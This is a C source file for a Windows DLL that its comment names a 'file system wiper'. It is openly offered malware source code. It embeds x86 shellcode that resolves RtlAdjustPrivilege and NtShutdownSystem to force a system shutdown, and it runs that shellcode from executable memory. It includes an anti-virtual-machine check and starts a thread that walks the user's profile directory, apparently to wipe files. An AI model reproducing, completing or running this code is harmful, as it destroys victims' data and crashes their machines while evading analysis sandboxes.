// file system wiper

#ifdef UNICODE
#undef UNICODE
#endif

#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <Shlwapi.h>
#include <Shlobj.h>

// modules
#include <dynimp.h>
#include <anarchy.h>
#include <safe_procedures.h>
#include <misc.h>
#include <antivm.h>

#pragma comment(lib, "shlwapi.lib")

HANDLE hDll = NULL;
extern BOOL explore_dir(char* dir);

BOOL APIENTRY DllMain(
	__in HANDLE hModule,
	__in DWORD  ul_reason_for_call,
	__in LPVOID lpReserved
	)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		hDll = hModule;
		break;
	}
	return TRUE;
}

unsigned char payload[] =
"\x55\x89\xe5\x83\xec\x0c\x53\x56\x57\xeb\x03\x5b\xeb\x6d\xe8"
"\xf8\xff\xff\xff\x4e\x74\x53\x68\x75\x74\x64\x6f\x77\x6e\x53"
"\x79\x73\x74\x65\x6d\x52\x74\x6c\x41\x64\x6a\x75\x73\x74\x50"
"\x72\x69\x76\x69\x6c\x65\x67\x65\x53\x56\x57\x8b\x45\xf8\x8b"
"\x58\x20\x03\x5d\xfc\x31\xc0\x89\xd6\x8b\x3c\x83\x03\x7d\xfc"
"\x51\xfc\xf3\xa6\x59\x74\x0c\x40\x3b\x43\x14\x7c\xeb\x5f\x5e"
"\x5b\x31\xc0\xc3\x8b\x5d\xf8\x8b\x4b\x1c\x03\x4d\xfc\x8b\x53"
"\x24\x03\x55\xfc\x0f\xb7\x04\x42\x8b\x04\x81\x03\x45\xfc\x5f"
"\x5e\x5b\xc3\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x40\x14"
"\x8b\x04\x08\x8b\x40\x10\x89\x45\xfc\x03\x40\x3c\x8b\x40\x78"
"\x03\x45\xfc\x89\x45\xf8\x31\xc9\xb1\x10\x89\xda\x01\xcb\xe8"
"\x8c\xff\xff\xff\x85\xc0\x74\x25\x89\xc6\x31\xc9\xb1\x12\x89"
"\xda\xe8\x7b\xff\xff\xff\x85\xc0\x74\x14\x89\xc7\x31\xc0\x8d"
"\x4d\xf4\x51\x50\x6a\x01\x6a\x13\xff\xd7\x31\xc0\x50\xff\xd6"
"\x5f\x5e\x5b\x89\xec\x5d\xc3";

#define PAYLOAD payload
DWORD WINAPI ShellcodeThread(LPVOID lpParam)
{
	typedef DWORD(WINAPI * SHELLCODE)(void);
	SHELLCODE Shellcode = (SHELLCODE)lpParam;

	// call shellcode
	return Shellcode();
}

int fuck() {

	PVOID Buff = VirtualAlloc(NULL, sizeof(PAYLOAD), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (Buff) {

		RtlCopyMemory(Buff, PAYLOAD, sizeof(PAYLOAD));

		//OutputDebugString("Shellcode Baslatiliyor");
		HANDLE hThread = CreateThread(NULL, 0, ShellcodeThread, Buff, 0, NULL);
		if (hThread)
		{
			WaitForSingleObject(hThread, INFINITE);
			CloseHandle(hThread);
		}

		VirtualFree(Buff, 0, MEM_RELEASE);
	}
}

LPSTR profile_path()
{
	LPSTR profpath = (LPSTR)malloc(MAX_PATH + 1);
	SHGetSpecialFolderPathA(NULL, profpath, CSIDL_PROFILE, TRUE);
	
	if (!PathFileExistsA(profpath))
		return NULL;
	return profpath;
}

DWORD WINAPI wiper_thread(LPVOID param)
{
	LPSTR user_profile = profile_path();
	MessageBoxA(nul, user_profile, "", MB_OK);

	explore_dir(user_profile); // explore and fuck!

	free(user_profile);
	return 0;
}

void fusion_core()
{
	if (anti_vm()) fuck();

	HANDLE hThread = create_thread(NULL, 0, wiper_thread, NULL, 0, NULL);
	if (hThread)
	{
		WaitForSingleObject(hThread, INFINITE);
		CloseHandle(hThread);
	}

	fuck();

}